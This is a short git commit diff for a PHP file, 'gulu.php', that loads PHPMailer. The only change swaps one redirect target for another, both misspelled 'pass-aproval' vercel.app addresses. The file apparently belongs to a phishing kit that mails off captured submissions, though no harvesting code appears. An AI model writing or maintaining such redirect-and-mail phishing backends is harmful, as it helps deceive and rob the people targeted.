bfc7b179c1105b42174e4c3503742df0fb460243
kameronjustine234 <kameronjustine234@gmail.com>
2025-07-20 22:17:18 +0500

    Update gulu.php

--- gulu.php
+++ gulu.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://abi-pass-aproval-submit.vercel.app/");
+header("Location: https://pass-aproval.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
